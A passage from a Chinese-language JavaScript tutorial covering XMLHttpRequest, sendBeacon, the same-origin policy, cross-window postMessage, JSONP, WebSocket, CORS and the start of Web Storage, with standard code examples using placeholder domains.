  <span class="kd">let</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
  <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;/server&#39;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
  <span class="nx">xhr</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="kd">let</span> <span class="nx">progressBar</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;progress&#39;</span><span class="p">);</span>
  <span class="nx">xhr</span><span class="p">.</span><span class="nx">upload</span><span class="p">.</span><span class="nx">onprogress</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">progressBar</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">loaded</span><span class="o">/</span><span class="nx">e</span><span class="p">.</span><span class="nx">total</span><span class="p">)</span> <span class="o">*</span> <span class="mf">100</span><span class="p">;</span>
    <span class="nx">progressBar</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">progressBar</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span> <span class="c1">// 兼容老浏览器</span>
  <span class="p">}</span>
  <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">blobOrFile</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">let</span> <span class="nx">file</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Blob</span><span class="p">([</span><span class="s1">&#39;hello world&#39;</span><span class="p">]);</span>
<span class="nx">upload</span><span class="p">(</span><span class="nx">file</span><span class="p">,</span> <span class="p">{</span><span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span><span class="p">});</span>
</code></pre></div>

<h4 id="_14">实例方法<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h4>
<ul>
<li>
<p>xhr.open('GET', url, true, userName, password) 传输的方法，URL，是否异步（默认是异步），用户名和密码（后两个参数可选）如果对使用过open的xhr再次使用open，相当于 abort 关闭这个请求。</p>
</li>
<li>
<p>xhr.sned(data); 如果是get请求，只发送URL，这里直接传null即可。如果是post请求，这里需要传入数据。数据的格式可以是blob DOM string arraybuffer formdata(表单更常用)</p>
</li>
</ul>
<p>~~~js
  var formData = new FormData();
  formData.append('username', '张三');
  formData.append('email', 'zhangsan@example.com');
  formData.append('birthDate', 1940);</p>
<p>xhr.open('POST', 'http://www.example.com', true);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.send(formData);
  ~~~</p>
<ul>
<li>xhr.setRequestHeader('Content-Type', 'application/json');  设置请求头的信息，必须位于xhr.open() 和 xhr.send() 之间。第一个参数是字段名，第二个是字段值。如果该方法多次调用，设定同一个字段，则每一次调用的值会被合并成一个单一的值发送。</li>
</ul>
<p>~~~
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.setRequestHeader('Content-Length', JSON.stringify(data).length);
  xhr.send(JSON.stringify(data));
  这里设置了数据类型是JSON，设置数据的长度。改进：stringify 耗时，可以执行一次
  ~~~</p>
<ul>
<li>
<p>xhr.overrideMimeType('text/plain') 这个方法尽量不要使用；如果指定某一个数据类型，返回的数据是text/xml，但是各种原因造成浏览器解析不成功，需要获取原始数据，那么就设置这个属性。如果希望服务器返回指定的数据类型，可以用<code>responseType</code>属性告诉服务器。</p>
</li>
<li>
<p>xhr.getResponseHeader('Last') 获取响应头的信息</p>
</li>
</ul>
<p>~~~js
  xhr.onload = () =&gt; {
    console.log(this.getResponseHeader('Last-Modified'));
  }
  ~~~</p>
<ul>
<li>xhr.getAllResponseHeaders() 获取响应头的全部信息（字符串）</li>
</ul>
<p>~~~txt
  date: Fri, 08 Dec 2017 21:04:30 GMT\r\n
  content-encoding: gzip\r\n
  x-content-type-options: nosniff\r\n
  server: meinheld/0.6.1\r\n
  x-frame-options: DENY\r\n
  content-type: text/html; charset=utf-8\r\n
  connection: keep-alive\r\n
  strict-transport-security: max-age=63072000\r\n
  vary: Cookie, Accept-Encoding\r\n
  content-length: 6502\r\n
  x-xss-protection: 1; mode=block\r\n
  ~~~</p>
<p>可以处理这个字符串获取信息</p>
<p>~~~js
  var headerString = xhr.getAllResponseHeaders();
  let arr = headerString.trim().split(/[\r\n]+/);
  let headerInfo = {};</p>
<p>arr.forEach((item) =&gt; {
    let parts = item.split(': ');
    let key = parts.shift();
    let value = parts.join(': ');
    headerInfo[key] = value;
  });
  ~~~</p>
<ul>
<li>xhr.abort() 终止发送的请求，此时 readyState is 4, status is 0.</li>
</ul>
<h4 id="_15">实例事件<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h4>
<ul>
<li>readystatechange === 4 请求成功，可以获取服务器返回的数据</li>
<li>progress 返回上传的进度 xhr.addEventListener('progress', updateProgress);</li>
<li>load abort error</li>
<li>loadend 上面三个事件后，会触发这个事件，但是不确定是否加载成功</li>
<li>timeout 超时事件</li>
</ul>
<h4 id="navigatorsendbeacon">Navigator.sendBeacon()<a class="headerlink" href="#navigatorsendbeacon" title="Permanent link">&para;</a></h4>
<p>如果在界面关闭时，需要发送请求，那么请求是异步的，可能界面已经卸载了才发送请求，这样会造成错误。传统的解决思路是设置一个睡眠函数或者消耗函数拖延时间，但是用户体验和浏览器性能不好。</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// a time-consuming operation, bad</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mf">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mf">10000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">m</span> <span class="o">=</span> <span class="mf">1</span><span class="p">;</span> <span class="nx">m</span> <span class="o">&lt;</span> <span class="mf">10000</span><span class="p">;</span> <span class="nx">m</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">continue</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>所以使用 Navigator.sendBeacon() 方法：这个方法还是异步发出请求，但是请求与当前页面线程脱钩，作为浏览器进程的任务，因此可以保证会把数据发出去，不拖延卸载流程。</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// &lt;body onload=&quot;analytics(&#39;start&#39;)&quot; onunload=&quot;analytics(&#39;end&#39;)&quot;&gt;</span>
<span class="kd">function</span> <span class="nx">analytics</span><span class="p">(</span><span class="nx">state</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">navigator</span><span class="p">.</span><span class="nx">sendBeacon</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="kd">var</span> <span class="nx">data</span> <span class="o">=</span> <span class="s1">&#39;state=&#39;</span> <span class="o">+</span> <span class="nx">state</span> <span class="o">+</span> <span class="s1">&#39;&amp;location=&#39;</span> <span class="o">+</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">;</span>
  <span class="nx">navigator</span><span class="p">.</span><span class="nx">sendBeacon</span><span class="p">(</span><span class="s1">&#39;http://example.com/analytics&#39;</span><span class="p">,</span> <span class="nx">data</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<h3 id="107">10.7 同源策略<a class="headerlink" href="#107" title="Permanent link">&para;</a></h3>
<h4 id="same-origin">Same-origin 介绍<a class="headerlink" href="#same-origin" title="Permanent link">&para;</a></h4>
<p>起源：不同源的网页不能打开cookie。</p>
<p>同源：协议域名端口都相同。</p>
<p>目的：保证用户数据的安全，防止恶意网站窃取用户数据。</p>
<p>现在：无法获取非同源网页的cookie，localStorage，IndexedDB；DOM；无法发送AJAX请求。</p>
<p>非同源网页可以调用下面的属性和方法。</p>
<div class="codehilite"><pre><span></span><code><span class="nb">window</span><span class="p">.</span><span class="nx">closed</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">frames</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">length</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">location</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">opener</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">parent</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">self</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">top</span>
<span class="nb">window</span><span class="p">.</span><span class="nb">window</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">blur</span><span class="p">()</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">close</span><span class="p">()</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">focus</span><span class="p">()</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">()</span>
</code></pre></div>

<h4 id="cookie">Cookie 共享<a class="headerlink" href="#cookie" title="Permanent link">&para;</a></h4>
<p>两个网页的一级域名相同（seafile.com）次级域名不同（docs.demo）可以设置 document.domain 相同来共享cookie，设置是会重置端口为null。两个页面需要同时设置 document.domain = 'seafile.com'; 才能达到同源的目的。设置后两个界面可以通过 document.cookie 获取相同的信息。</p>
<h4 id="iframe">iframe多窗口通信<a class="headerlink" href="#iframe" title="Permanent link">&para;</a></h4>
<p>一个界面中嵌入多个窗口，一个窗口可以获取父窗口和子窗口的window，如果不同源，不能操作DOM（document.getElementByID('myIframe')..contentWindow.document 会报错）。</p>
<p>如果两个窗口的一级域名相同，次级域名不同，可以类似cookie 设置 document.domain。</p>
<p>如果l两个窗口完全不同源，需要使用下面的两个方案（开发中未使用）：</p>
<p><strong>片段识别符</strong></p>
<p>片段标识符（fragment identifier）指的是，URL 的<code>#</code>号后面的部分，比如<code>http://example.com/x.html#fragment</code>的<code>#fragment</code>。如果只是改变片段标识符，页面不会重新刷新。</p>
<p>父窗口可以把信息，写入子窗口的片段标识符。</p>
<div class="codehilite"><pre><span></span><code>var src = originURL + &#39;#&#39; + data;
document.getElementById(&#39;myIFrame&#39;).src = src;
</code></pre></div>

<p>上面代码中，父窗口把所要传递的信息，写入 iframe 窗口的片段标识符。</p>
<p>子窗口通过监听<code>hashchange</code>事件得到通知。</p>
<div class="codehilite"><pre><span></span><code>window.onhashchange = checkMessage;

function checkMessage() {
  var message = window.location.hash;
  // ...
}
</code></pre></div>

<p>同样的，子窗口也可以改变父窗口的片段标识符。</p>
<div class="codehilite"><pre><span></span><code>parent.location.href = target + &#39;#&#39; + hash;
</code></pre></div>

<p><strong>window.postMessage()</strong></p>
<p>上面的这种方法属于破解，HTML5 为了解决这个问题，引入了一个全新的API：跨文档通信 API（Cross-document messaging）。</p>
<p>这个 API 为<code>window</code>对象新增了一个<code>window.postMessage</code>方法，允许跨窗口通信，不论这两个窗口是否同源。举例来说，父窗口<code>aaa.com</code>向子窗口<code>bbb.com</code>发消息，调用<code>postMessage</code>方法就可以了。</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// 父窗口打开一个子窗口</span>
<span class="kd">var</span> <span class="nx">popup</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;http://bbb.com&#39;</span><span class="p">,</span> <span class="s1">&#39;title&#39;</span><span class="p">);</span>
<span class="c1">// 父窗口向子窗口发消息</span>
<span class="nx">popup</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="s1">&#39;Hello World!&#39;</span><span class="p">,</span> <span class="s1">&#39;http://bbb.com&#39;</span><span class="p">);</span>
</code></pre></div>

<p><code>postMessage</code>方法的第一个参数是具体的信息内容，第二个参数是接收消息的窗口的源（origin），即“协议 + 域名 + 端口”。也可以设为<code>*</code>，表示不限制域名，向所有窗口发送。</p>
<p>子窗口向父窗口发送消息的写法类似。</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// 子窗口向父窗口发消息</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">opener</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="s1">&#39;Nice to see you&#39;</span><span class="p">,</span> <span class="s1">&#39;http://aaa.com&#39;</span><span class="p">);</span>
</code></pre></div>

<p>父窗口和子窗口都可以通过<code>message</code>事件，监听对方的消息。</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// 父窗口和子窗口都可以用下面的代码，</span>
<span class="c1">// 监听 message 消息</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
<span class="p">},</span><span class="kc">false</span><span class="p">);</span>
</code></pre></div>

<p><code>message</code>事件的参数是事件对象<code>event</code>，提供以下三个属性。</p>
<blockquote>
<ul>
<li><code>event.source</code>：发送消息的窗口</li>
<li><code>event.origin</code>: 消息发向的网址</li>
<li><code>event.data</code>: 消息内容</li>
</ul>
</blockquote>
<p>下面的例子是，子窗口通过<code>event.source</code>属性引用父窗口，然后发送消息。</p>
<div class="codehilite"><pre><span></span><code><span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span> <span class="nx">receiveMessage</span><span class="p">);</span>
<span class="kd">function</span> <span class="nx">receiveMessage</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">event</span><span class="p">.</span><span class="nx">source</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="s1">&#39;Nice to see you!&#39;</span><span class="p">,</span> <span class="s1">&#39;*&#39;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>上面代码有几个地方需要注意。首先，<code>receiveMessage</code>函数里面没有过滤信息的来源，任意网址发来的信息都会被处理。其次，<code>postMessage</code>方法中指定的目标窗口的网址是一个星号，表示该信息可以向任意网址发送。通常来说，这两种做法是不推荐的，因为不够安全，可能会被恶意利用。</p>
<p><code>event.origin</code>属性可以过滤不是发给本窗口的消息。</p>
<div class="codehilite"><pre><span></span><code>window.addEventListener(&#39;message&#39;, receiveMessage);
function receiveMessage(event) {
  if (event.origin !== &#39;http://aaa.com&#39;) return;
  if (event.data === &#39;Hello World&#39;) {
    event.source.postMessage(&#39;Hello&#39;, event.origin);
  } else {
    console.log(event.data);
  }
}
</code></pre></div>

<p><strong>LocalStorage</strong></p>
<p>通过<code>window.postMessage</code>，读写其他窗口的 LocalStorage 也成为了可能。</p>
<p>下面是一个例子，主窗口写入 iframe 子窗口的<code>localStorage</code>。</p>
<div class="codehilite"><pre><span></span><code>window.onmessage = function(e) {
  if (e.origin !== &#39;http://bbb.com&#39;) {
    return;
  }
  var payload = JSON.parse(e.data);
  localStorage.setItem(payload.key, JSON.stringify(payload.data));
};
</code></pre></div>

<p>上面代码中，子窗口将父窗口发来的消息，写入自己的 LocalStorage。</p>
<p>父窗口发送消息的代码如下。</p>
<div class="codehilite"><pre><span></span><code>var win = document.getElementsByTagName(&#39;iframe&#39;)[0].contentWindow;
var obj = { name: &#39;Jack&#39; };
win.postMessage(
  JSON.stringify({key: &#39;storage&#39;, data: obj}),
  &#39;http://bbb.com&#39;
);
</code></pre></div>

<p>加强版的子窗口接收消息的代码如下。</p>
<div class="codehilite"><pre><span></span><code>window.onmessage = function(e) {
  if (e.origin !== &#39;http://bbb.com&#39;) return;
  var payload = JSON.parse(e.data);
  switch (payload.method) {
    case &#39;set&#39;:
      localStorage.setItem(payload.key, JSON.stringify(payload.data));
      break;
    case &#39;get&#39;:
      var parent = window.parent;
      var data = localStorage.getItem(payload.key);
      parent.postMessage(data, &#39;http://aaa.com&#39;);
      break;
    case &#39;remove&#39;:
      localStorage.removeItem(payload.key);
      break;
  }
};
</code></pre></div>

<p>加强版的父窗口发送消息代码如下。</p>
<div class="codehilite"><pre><span></span><code>var win = document.getElementsByTagName(&#39;iframe&#39;)[0].contentWindow;
var obj = { name: &#39;Jack&#39; };
// 存入对象
win.postMessage(
  JSON.stringify({key: &#39;storage&#39;, method: &#39;set&#39;, data: obj}),
  &#39;http://bbb.com&#39;
);
// 读取对象
win.postMessage(
  JSON.stringify({key: &#39;storage&#39;, method: &quot;get&quot;}),
  &quot;*&quot;
);
window.onmessage = function(e) {
  if (e.origin != &#39;http://aaa.com&#39;) return;
  console.log(JSON.parse(e.data).name);
};
</code></pre></div>

<h4 id="ajax">Ajax 处理跨域<a class="headerlink" href="#ajax" title="Permanent link">&para;</a></h4>
<p>服务器端处理：架设代理服务器：浏览器访问同源服务器，服务器请求外部服务。还有三种方法：JSONP，websocket， CORS。</p>
<h5 id="1jsonp">1、JSONP<a class="headerlink" href="#1jsonp" title="Permanent link">&para;</a></h5>
<p>JSONP 简单易用，没有兼容性问题，老式浏览器全部支持，服务端改造非常小。</p>
<p>它的做法如下。</p>
<p>第一步，网页添加一个<code>&lt;script&gt;</code>元素，向服务器请求一个脚本，这不受同源政策限制，可以跨域请求。</p>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://api.foo.com?callback=bar&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre></div>

<p>注意，请求的脚本网址有一个<code>callback</code>参数（<code>?callback=bar</code>），用来告诉服务器，客户端的回调函数名称（<code>bar</code>）。</p>
<p>第二步，服务器收到请求后，拼接一个字符串，将 JSON 数据放在函数名里面，作为字符串返回（<code>bar({...})</code>）。</p>
<p>第三步，客户端会将服务器返回的字符串，作为代码解析，因为浏览器认为，这是<code>&lt;script&gt;</code>标签请求的脚本内容。这时，客户端只要定义了<code>bar()</code>函数，就能在该函数体内，拿到服务器返回的 JSON 数据。</p>
<p>下面看一个实例。首先，网页动态插入<code>&lt;script&gt;</code>元素，由它向跨域网址发出请求。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">function</span> <span class="nx">addScriptTag</span><span class="p">(</span><span class="nx">src</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">script</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;script&#39;</span><span class="p">);</span>
  <span class="nx">script</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s1">&#39;type&#39;</span><span class="p">,</span> <span class="s1">&#39;text/javascript&#39;</span><span class="p">);</span>
  <span class="nx">script</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">src</span><span class="p">;</span>
  <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">script</span><span class="p">);</span>
<span class="p">}</span>

<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
  <span class="nx">addScriptTag</span><span class="p">(</span><span class="s1">&#39;http://example.com/ip?callback=foo&#39;</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">foo</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Your public IP address is: &#39;</span> <span class="o">+</span> <span class="nx">data</span><span class="p">.</span><span class="nx">ip</span><span class="p">);</span>
<span class="p">};</span>
</code></pre></div>

<p>上面代码通过动态添加<code>&lt;script&gt;</code>元素，向服务器<code>example.com</code>发出请求。注意，该请求的查询字符串有一个<code>callback</code>参数，用来指定回调函数的名字，这对于 JSONP 是必需的。</p>
<p>服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。</p>
<div class="codehilite"><pre><span></span><code>foo({
  &#39;ip&#39;: &#39;8.8.8.8&#39;
});
</code></pre></div>

<p>由于<code>&lt;script&gt;</code>元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了<code>foo</code>函数，该函数就会立即调用。作为参数的 JSON 数据被视为 JavaScript 对象，而不是字符串，因此避免了使用<code>JSON.parse</code>的步骤。</p>
<h5 id="2websocket">2、WebSocket<a class="headerlink" href="#2websocket" title="Permanent link">&para;</a></h5>
<p>WebSocket 是一种通信协议，使用<code>ws://</code>（非加密）和<code>wss://</code>（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。</p>
<p>下面是一个例子，浏览器发出的 WebSocket 请求的头信息。</p>
<div class="codehilite"><pre><span></span><code>GET /chat HTTP/1.1
Host: server.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
Sec-WebSocket-Protocol: chat, superchat
Sec-WebSocket-Version: 13

Origin: http://example.com
</code></pre></div>

<p>上面代码中，有一个字段是<code>Origin</code>，表示该请求的请求源（origin），即发自哪个域名。</p>
<p>正是因为有了<code>Origin</code>这个字段，所以 WebSocket 才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。</p>
<div class="codehilite"><pre><span></span><code>HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=
Sec-WebSocket-Protocol: chat
</code></pre></div>

<h5 id="3cors">3、CORS<a class="headerlink" href="#3cors" title="Permanent link">&para;</a></h5>
<h3 id="108-cors">10.8 CORS<a class="headerlink" href="#108-cors" title="Permanent link">&para;</a></h3>
<h4 id="cors">CORS概述<a class="headerlink" href="#cors" title="Permanent link">&para;</a></h4>
<p>CORS 是跨源资源分享（Cross-Origin Resource Sharing）的缩写，它是 W3C 标准，属于跨源 AJAX 请求的根本解决方法。相比 JSONP 只能发<code>GET</code>请求，CORS 允许任何类型的请求。JSONP 的优势在于支持老式浏览器，以及可以向不支持 CORS 的网站请求数据。</p>
<p>兼容：CORS 需要浏览器和服务器同时支持，目前浏览器都支持。对于前端开发，CORS和AJAX差不多，如果发出的请求是跨域的，那么在请求头更改信息，用户体验良好。后端开发需要在服务器实现CORS API。</p>
<p>分类：简单请求和非简单请求</p>
<p>简单请求：请求方法（get-post-head）和请求头信息简单，请求头只能是下面的属性。简单请求类似于表单请求，浏览器允许表单请求跨域。</p>
<div class="codehilite"><pre><span></span><code><span class="nx">Accept</span>
<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span>
<span class="nx">Content</span><span class="o">-</span><span class="nx">Language</span>
<span class="nx">Last</span><span class="o">-</span><span class="nx">Event</span><span class="o">-</span><span class="nx">ID</span>
<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="err">：</span><span class="nx">只限于三个值application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span><span class="err">、</span><span class="nx">multipart</span><span class="o">/</span><span class="nx">form</span><span class="o">-</span><span class="nx">data</span><span class="err">、</span><span class="nx">text</span><span class="o">/</span><span class="nx">plain</span>
</code></pre></div>

<h4 id="_16">简单请求<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h4>
<p>浏览器发现请求跨域，需要在请求头中加入 Origin: https://demo.seafile.com 字段，包括当前请求的协议域名端口号；服务器判断这个origin在许可的范围内，在相应头中添加 Access-Control-Allow-Origin 字段，实现跨域；如果这个origin不在许可范围内，就返回正常的HTTP回应，不包含 Access-Control-Allow-Origin 字段，此时前端xhr.onerror 会捕获到这个错误。下面是正确的字符说明</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// 服务器的响应头</span>
<span class="nx">Access</span><span class="o">-</span><span class="nx">Control</span><span class="o">-</span><span class="nx">Allow</span><span class="o">-</span><span class="nx">Origin</span><span class="o">:</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//api.bob.com // 必选参数，返回值是origin的参数，或者是*，表示接受任意域名的请求</span>
<span class="nx">Access</span><span class="o">-</span><span class="nx">Control</span><span class="o">-</span><span class="nx">Allow</span><span class="o">-</span><span class="nx">Credentials</span><span class="o">:</span> <span class="kc">true</span> <span class="c1">// 可选参数：这个值表示是否发送cookie，只能设置为true，不设置就表示false（默认浏览器cookie不包括在CORS请求中）</span>
<span class="nx">Access</span><span class="o">-</span><span class="nx">Control</span><span class="o">-</span><span class="nx">Expose</span><span class="o">-</span><span class="nx">Headers</span><span class="o">:</span> <span class="nx">FooBar</span> <span class="c1">// 可选参数：JS脚本默认可以获取部分响应头信息，这里加上这个属性，表示可以获取这个信息：getResponseHeader(&#39;FooBar&#39;) </span>
<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">;</span> <span class="nx">charset</span><span class="o">=</span><span class="nx">utf</span><span class="o">-</span><span class="mf">8</span>
</code></pre></div>

<p>默认CORS请求不包含 cookie，为了避免CSRF风险。如果需要发送cookie，前端需要设置 xhr.withCredentials = true; 服务器会返回 Access-Control-Allow-Credentials: true，实现跨域。</p>
<p>如果服务器要求浏览器发送 Cookie，<code>Access-Control-Allow-Origin</code>就不能设为星号，必须指定明确的、与请求网页一致的域名。</p>
<h4 id="_17">非简单请求<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h4>
<p>非简单请求：请求的方法特殊（PUT DELETE）请求头的字段特殊（Content-Type: 'application/json'）</p>
<p>第一步 预检请求（preflight）</p>
<p>在通信开始前，发送一个预检请求，浏览器询问服务器当前网页所在域名是否在服务器的许可列表中，哪些请求方法和请求头字段是允许的。服务器响应同意后，浏览器可以继续发送请求。如果不同意就不能发送；这样避免了服务器收到大量跨域的PUT delete请求。下面是一个预检请求的请求头：</p>
<div class="codehilite"><pre><span></span><code>OPTIONS /cors HTTP/1.1 预检请求的方法是 OPTIONS
Origin: http://api.bob.com 源是网页的网址
Access-Control-Request-Method: PUT 这是可以接受的请求方法
Access-Control-Request-Headers: X-Custom-Header 这里是自定义的请求头字段
Host: api.alice.com
Accept-Language: en-US
Connection: keep-alive
User-Agent: Mozilla/5.0...
</code></pre></div>

<p>第二步 服务器响应</p>
<p>服务器收到预检请求，允许跨域，做出回应，响应头如下</p>
<div class="codehilite"><pre><span></span><code>HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 01:15:39 GMT
Server: Apache/2.0.61 (Unix)
Access-Control-Allow-Origin: http://api.bob.com 这里表示当前网页可以跨域
Access-Control-Allow-Methods: GET, POST, PUT 这里是可以跨域的方法
Access-Control-Allow-Headers: X-Custom-Header
Content-Type: text/html; charset=utf-8
Content-Encoding: gzip
Content-Length: 0
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Content-Type: text/plain
</code></pre></div>

<p>如果不允许跨域，onerror 会捕获错误</p>
<div class="codehilite"><pre><span></span><code>XMLHttpRequest cannot load http://api.alice.com.
Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin.
</code></pre></div>

<p>第三步 浏览器正常的请求</p>
<p>浏览器自动添加Origin字段，发送正常的请求</p>
<h3 id="109-storage">10.9 Storage<a class="headerlink" href="#109-storage" title="Permanent link">&para;</a></h3>
<p>Storage API 的实例对象有两个：window.localStorage and window.sessionStorage。他们的区别是，关闭当前窗口（对话）后存储是否继续保留。保存的数据以键值对保存，实际上是一个字符串（数值参数会转化成字符串存储）。每个域名的存储不同，最小的chrome是2.5MB，也受同域限制，跨域操作会报错。</p>
<p>属性和方法</p>
<div class="codehilite"><pre><span></span><code><span class="mf">1</span><span class="err">、</span><span class="nb">window</span><span class="p">.</span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">length</span>

<span class="mf">2</span><span class="err">、</span><span class="nb">window</span><span class="p">.</span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="s1">&#39;key&#39;</span><span class="p">,</span> <span class="s1">&#39;value&#39;</span><span class="p">);</span> <span class="c1">// 这里设置的key-value都是字符串，其他数据类型会强制转换成字符串，方法没有返回值。如果存储满了，这个方法会报错。或者直接改变属性也可以。如果已有这个key, 重新设置会覆盖原始值。</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">localStorage</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>

<span class="mf">3</span><span class="err">、</span><span class="nb">window</span><span class="p">.</span><span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="s1">&#39;foo&#39;</span><span class="p">)</span> <span class="nx">如果不存在就返回</span> <span class="kc">null</span>

<span class="mf">4</span><span class="err">、</span><span class="nb">window</span><span class="p">.</span><span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">removeItem</span><span class="p">(</span><span class="s1">&#39;foo&#39;</span><span class="p">)</span> <span class="nx">如果key不存在</span><span class="err">，</span><span class="nx">方法不会报错</span><span class="err">；</span>
